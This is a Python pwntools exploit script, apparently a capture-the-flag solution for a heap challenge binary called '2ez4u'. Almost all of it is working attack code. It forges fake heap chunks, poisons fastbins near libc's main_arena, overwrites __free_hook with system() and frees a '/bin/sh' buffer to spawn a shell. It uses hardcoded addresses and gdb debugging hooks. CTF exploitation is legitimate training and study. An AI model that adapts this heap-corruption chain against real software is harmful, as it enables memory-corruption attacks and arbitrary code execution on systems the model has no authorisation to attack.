# -*- coding:utf-8 -*-
#!/usr/bin/env python
# get shell @ 2019-11-15 01:22:17
# 没有leak
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
name = './2ez4u-patch'
# name = './2ez4u'
r = process(name)

# libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
binn = ELF(name)

def Add(color,value,num,desc):
    r.recvuntil("your choice:")
    r.sendline("1")
    r.sendline('a')
    r.sendline('a')
    r.sendline('a')
    r.recvuntil("description length?(1-1024):")
    r.sendline(str(len(desc)))
    r.recvuntil("description of the apple:")
    r.send(desc)

def Edit(index, color, value, num, desc):
    r.recvuntil("your choice:")
    r.sendline("3")
    r.recvuntil("which?(0-15):")
    r.sendline(str(index))
    r.sendline(str(color))
    r.sendline(str(value))
    r.sendline(str(num))
    r.recvuntil("new description of the apple:")
    r.send(desc)

def add(desc):
    Add(2,1000,17,desc)

def add2(size, desc):
    r.recvuntil("your choice:")
    r.sendline("1")
    r.sendline("a")
    r.sendline("a")
    r.sendline("0")
    r.recvuntil("description length?(1-1024):")
    r.sendline(str(size))
    r.recvuntil("description of the apple:")
    r.send(desc)

def d(index):
    r.recvuntil("your choice:")
    r.sendline("2")
    r.recvuntil("which?(0-15):")
    r.sendline(str(index))

def edit(index, desc):
    Edit(index,2,1000,17,desc)

def show(index):
    r.recvuntil("your choice:")
    r.sendline("4")
    r.recvuntil("which?(0-15):")
    r.sendline(str(index))

def ad(p=1):
    print(str(r.proc.pid))
    gdb.attach(r, """
    heap
    x/20gx 0x0202040+0x555555554000
    bins
    
    x/30gx 0x7ffff7dd5b20
      x/gx &main_arena->top
    p main_arena->fastbinsY
    define fu
        set $b = 0x555555756040
        if $argc > 0
            x/2gx $b+0x10*$arg0
        else

        end
        if $argc == 2
            # x/$arg1gx ($k1 ^ *(long *)($b + ($arg0*0x10) ))-0x10
        end
    end
    x/10gx 0x7ffff7dd77a8

    """);
    r.interactive()
    if p == 1:
        pause()

add("A"*0x3f0) #0
add("B") #1
add("B") #2
add("B") #3
add("A"*0x3e0) #4
add("B") #5
add("A"*0x400) #6
add("B"*0x50) #7
add("B"*0x50) #8
add("B"*0x20) #9
add("B"*0x20) #10

d(0)
d(2)
d(4)
add("A"*0x400) #0  0x0000555555758140 最下面，top上面



ad()

fake = 0x555555759c10
fake_f = fake+0x30
payload = ""
payload += p64(0)+p64(0)+p64(0)
payload += "A"*0x300
payload += p64(0)+p64(0x411) # fake chunk 
payload += p64(fake_f-0x18)+p64(fake_f-0x10) 
payload += p64(0)+p64(0) # needed!
payload += p64(fake)
edit(6, payload+"\n") 
# ad()


edit(0, 0x1a8*"A"+p64(0x410)+p64(0x21)+'\n')
# ad()

payload = ""
payload += p64(fake) # bk_nextsize
# ad()
edit(4 , payload+"\n") #   
# d(1)
# ad()
add2(0x3f0, "A\n") # 2 0x555555759c20 success!!
# ad()
edit(4, p64(0x555555759000)+"\n") #repair

# 去掉bin中内容
add2(0x3e0,"\n") # 3
# ad() 
add2(0x3f0,"\n") #10
# ad()

d(8)
d(7)

evil_fd = 0x7ffff7dd5aed
# ad()
edit(2, (0xb8)*"A"+p64(0)+p64(0x71)+p64(evil_fd)+"\n")

add("A"*0x50) # 7
add2(0x50, "\n") #8  evil_fd
# ad()
# ad()
# edit(8, p64(0)+"A"*3+2*p64(0)+p64(0)*5+p64(0x3f)+p32(0)+p8(0)) # 0x7ffff7dd1b10-0x100
edit(8, p64(0)+"A"*3+2*p64(0)+p64(0)*3+p64(0x4f)+p64(0)*2+p32(0)+p8(0)) # 0x7ffff7dd1b10-0x100
# ad()

# r.sendline("")
d(9)
d(10)
# ad()

evil_fd = 0x7ffff7dd5b40 # 0---0x4f
edit(2,0x1e0*"B"+p64(0x41)+p64(evil_fd)+"\n")
# ad()

add2(0x20,"\n") #9
add2(0x20,p64(0)*4) #10
# ad()
# d(10)
# ad()

target = 0x7ffff7dd77a8-0xb58 #free_hook-0xb58
edit(10,p64(0)*2 + p64(target)+"\n") #???how to choice
# add2(0x400,"\n")
# add2(0x400,"\n")
# add2(0x400,"\n")

# ad()
# d(10)
edit(8, p64(0)+"A"*3+2*p64(0)+p64(0)*5+p64(0)+p32(0)+p8(0))

# ad()
add2(0x400,"\n")
add2(0x400,"\n")
add2(0x400,"\n") #14


system = 0x7ffff7a8832b
libc_base = 0x7ffff7a4c000 
# 0x3c0ab 0xcb775 0xcb77a 
one = libc_base + 0xcb77a
edit(14, 0x2f0*"\0"+p64(system)+"\n")
# d(12)
# ad()
edit(2, 0x1e0*"A"+p64(0x51)+"/bin/sh\0\n")

d(9)
ad() #get shell

# ad()
# edit(8, p64(0)+"A"*3+2*p64(0)+p64(0)*20) # clear

# d(2)
# d(10)
# d(11)

# add2(0x3e0,"\n")
# add2(0x3e0)


print(str(r.proc.pid))



